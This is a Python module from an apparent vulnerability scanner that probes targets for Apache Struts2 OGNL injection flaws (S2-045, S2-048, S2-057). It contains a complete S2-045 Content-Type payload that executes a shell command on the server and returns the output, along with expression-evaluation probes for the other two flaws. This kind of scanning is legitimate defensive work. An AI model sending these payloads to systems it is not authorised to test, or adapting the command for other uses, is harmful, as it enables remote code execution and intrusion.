from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("struts2_ognl")


@register_scanner
class Struts2OGNLScanner(BaseScanner):
    name = "Apache Struts2 OGNL注入漏洞集合"
    description = "Struts2框架OGNL表达式注入系列漏洞，可导致远程代码执行"
    category = "struts2"
    module = "struts2_ognl"
    risk_level = "critical"
    risk_score = 10
    cve_ids = [
        "CVE-2017-5638", "CVE-2018-11776", "CVE-2019-0230",
        "CVE-2020-17530", "CVE-2021-31805",
    ]
    references = [
        "https://nvd.nist.gov/vuln/detail/CVE-2017-5638",
        "https://cwiki.apache.org/confluence/display/WW/S2-045",
    ]
    fix_suggestion = "升级Struts至2.5.30+或6.1.2.1+，使用WAF拦截OGNL表达式特征"

    PAYLOADS = [
        {
            "name": "S2-045 (Content-Type OGNL)",
            "cve": "CVE-2017-5638",
            "headers": {
                "Content-Type": "%{(#_='multipart/form-data')."
                    "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                    "(#_memberAccess?(#_memberAccess=#dm):"
                    "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
                    "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
                    "(#ognlUtil.getExcludedPackageNames().clear())."
                    "(#ognlUtil.getExcludedClasses().clear())."
                    "(#context.setMemberAccess(#dm))))."
                    "(#cmd='id')."
                    "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
                    "(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd}))."
                    "(#p=new java.lang.ProcessBuilder(#cmds))."
                    "(#p.redirectErrorStream(true)).(#process=#p.start())."
                    "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                    "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
            },
            "detect": ["uid=", "command", "exec"],
        },
        {
            "name": "S2-048 (Struts1 Plugin OGNL)",
            "cve": "CVE-2017-9791",
            "path": "/integration/saveGangster.action",
            "data": "name=%{10*10}&age=20&__checkbox_bu498=true",
            "detect": ["100"],
        },
        {
            "name": "S2-057 (namespace OGNL)",
            "cve": "CVE-2018-11776",
            "path": "/${233*233}/actionChain1.action",
            "detect": ["54289"],
        },
    ]

    def check(self) -> bool:
        found = False

        vuln_paths = [
            "/", "/index.action", "/index.do", "/login.action", "/login.do",
            "/struts2-showcase/", "/user/", "/api/",
        ]

        is_struts = False
        for path in vuln_paths:
            url = f"{self.target}{path}"
            resp = http_request("GET", url)
            if resp is None:
                continue

            headers_str = str(resp.headers).lower()
            if ".action" in resp.url or ".do" in resp.url or "struts" in headers_str:
                is_struts = True
                break
            if "struts" in resp.text.lower() or ".action" in resp.text or ".do" in resp.text:
                is_struts = True
                break

        if not is_struts:
            return False

        for payload_info in self.PAYLOADS:
            url = f"{self.target}{payload_info.get('path', '/')}"

            if "headers" in payload_info:
                resp = http_request("POST", url, data="test", headers=payload_info["headers"])
            elif "data" in payload_info:
                resp = http_request("POST", url, data=payload_info["data"],
                                    headers={"Content-Type": "application/x-www-form-urlencoded"})
            else:
                resp = http_request("GET", url)

            if resp is None:
                continue

            for indicator in payload_info["detect"]:
                if indicator in resp.text:
                    self.add_result(
                        name=payload_info["name"],
                        risk_level="critical",
                        risk_score=10,
                        target_url=url,
                        detail=f"Struts2 {payload_info['name']} ({payload_info['cve']}) 漏洞确认",
                        payload=str(payload_info.get("headers", payload_info.get("data", ""))),
                        request_data=f"POST {url}",
                        response_snippet=resp.text[:500],
                        evidence=f"响应包含特征: {indicator}",
                    )
                    found = True
                    break
            if found:
                break

        return found
